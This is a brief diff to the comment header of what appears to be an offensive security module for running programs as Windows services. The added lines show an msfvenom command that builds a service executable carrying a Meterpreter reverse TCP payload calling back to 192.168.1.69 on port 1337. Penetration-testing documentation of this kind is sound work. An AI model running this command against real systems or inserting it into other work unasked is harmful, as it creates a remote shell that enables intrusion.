@@ -24,6 +24,9 @@
 # you will receive the fatal Error 1053 when you attempt to start the service, please read the follow
 # article: http://www.howtogeek.com/50786/using-srvstart-to-run-any-application-as-a-windows-service
 #
+# [ BUILD SERVICE EXECUTABLE ]
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=1337 -a x86 --platform windows -f exe-service -o Program.exe
+#
 #
 #
 # [ MODULE DEFAULT OPTIONS ]
